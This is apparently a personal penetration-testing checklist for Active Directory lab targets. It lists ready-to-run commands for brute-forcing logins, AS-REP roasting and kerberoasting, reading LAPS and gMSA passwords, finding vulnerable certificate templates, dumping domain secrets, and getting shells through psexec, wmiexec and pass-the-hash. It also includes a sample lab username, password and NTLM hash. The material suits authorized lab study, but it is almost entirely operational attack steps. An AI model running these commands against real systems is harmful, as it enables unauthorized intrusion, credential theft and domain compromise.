- [ ] Brute Dirty
```
brutedirty 192.168.102.227 USERNAME 'PASSWORD'
```

- [ ] try simple rdp 

```
xfreerdp3 /u:"USERNAME" /p:"PASSWORD" +clipboard /v:192.168.102.227
```

- [ ] Evil-winrm ( you never know)
```
evil-winrm -i 192.168.102.227 -u USERNAME -p 'PASSWORD'
```

- [ ] - Run Rust hound (alt bloodhound collector )
```
rusthound-ce --domain bossingit.biz -u USERNAME -p 'PASSWORD' -o ./BH_USERNAME/
```  

- [ ] AS-Reproast ??
```
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' --asreproast Hashes-AS-Rep-OUT.txt
```

- [ ] kerberoasting ??
```
nxc ldap 192.168.102.227 -u USERNAME -p 'PASSWORD' --kerberoasting Hashes-Kbrst--OUT.txt
```

LDEEP scan - https://github.com/franc-pentest/ldeep
```
ldeep ldap -u 'USERNAME' -p 'PASSWORD' -d 'bossingit.biz' -s 'ldap://DC_IP' all "ldeep_bossingit.biz"
```

Any user realated info?
```
ldapsearch -H ldap://192.168.102.227:389 -x -D 'USERNAME@bossingit.biz' -w 'PASSWORD' -b "DC=cicada,DC=htb" "(objectClass=user)" | tee ldap_userinfo-USERNAME.txt
```

Always Try for the Administrator Password (as Hutch PG) - Getting immidiate shell is not always the privesc path
```
ldapsearch -x -H 'ldap://192.168.102.227' -D 'bossingit.biz\USERNAME' -w 'PASSWORD' -b 'dc=hutch,dc=offsec' "(MS-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
- `ldapsearch -v -x -D "fmcsorley@HUTCH.OFFSEC" -w "CrabSharkJellyfish192" -b "DC=hutch,DC=offsec" -H ldap://192.168.240.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`


Cna we get all the info??
```
ldapsearch -H ldap://192.168.102.227:389 -x -D 'USERNAME@bossingit.biz' -w 'PASSWORD' -b "DC=cicada,DC=htb" -s sub "(objectClass=*)" "* +"
```

- [ ] Certipy
```
certipy find -u 'USERNAME@bossingit.biz' -p 'PASSWORD' -dc-ip 192.168.102.227 -vulnerable -json -stdout | tee CertypytMEGA.out
```

- [ ] - Run check for gMSA credentials ( if we have a service account name eg `svc_apache$` - Offsec Heist)
```
bloodyAD --host dc01.bossingit.biz -d PASSWORD -u USERNAME -p 'PASSWORD' get object SERVICE_ACC --attr msDS-ManagedPassword
```

```
nxc ldap 192.168.102.227 -k -u 'USERNAME' -p 'PASSWORD' --gmsa
```
The above is harded coded for 3899 , which might not be the right port. Might be able ot edit the port detials in : `/usr/lib/python3/dist-packages/impacket/ldap/ldap.py`



- [ ] - Run LinwinPwn
```
linwinrun -t 192.168.102.227 -d bossingit.biz -u USERNAME -p 'PASSWORD' --auto --verbose -T All -o bossingit.biz-USERNAME_LWP | tee USERNAME_LWP_OP.txt
```


- [ ] - Run this and make sure to specify the -dc-ip
```
impacket-GetUserSPNs bossingit.biz/USERNAME:'PASSWORD' -dc-ip 192.168.102.227 -request ( -output SPN.hashes)
```
- `hashcat -m 13100 SPN.hashes /usr/share/wordlists/rockyou.txt`

```
sudo impacket-GetUserSPNs bossingit.biz/USERNAME:'PASSWORD' -dc-ip 192.168.102.227 -debug -outputfile kerberoast.txt
```

- [ ] - Run 
```
impacket-wmiexec USERNAME:PASSWORD@192.168.102.227 "systeminfo"
```
- [ ] - Run 
```
impacket-smbexec USERNAME:PASSWORD@192.168.102.227 "whoami"
```
- [ ] - Run linWinPwn and bankthe terminal out put for later review_

```
script --flush --quiet LWP.TERMINAL_OUTPUT
```
```
linwinpwn -t 192.168.102.227 -d bossingit.biz -u USERNAME -p 'PASSWORD' --auto --verbose -T All
```

```
exit
```


Dump the secrets
```
impacket-secretsdump -user-status -history -pwd-last-set bossingit.biz/USERNAME@192.168.102.227 | tee SecretsDump.txt
```

Try nad get a shell 
```
impacket-psexec bossingit.biz/USERNAME:'PASSWORD'@192.168.102.227
```

```
xfreerdp3 /v:192.168.102.227 /u:"USERNAME" /p:'PASSWORD' /dynamic-resolution /cert:ignore /drive:Shared,/home/kali/Tools/ImmidiateTools
```

###### get a windows shell from linux with a hash like this 
```
pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.129.71.19 cmd
```




##### Run cmds as others
IF we have a shell and we want to run commands as another we can do the following 

```
P:> $pass = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force                             # PS Run commands as others - 1. convert Known password to secure string
```

n```
P:> $cred = New-Object System.Management.Automation.PSCredential("bossingit.biz\\USERNAME", $pass)   # PS Run commands as others - 2. Create a credential with the Host\\username and $pass
```

```
P:> Invoke-Command -ComputerNAme Sniper -Credential $cred -ScriptBlock {whoami}               # PS Run commands as others - 3. Run CMds as the user
```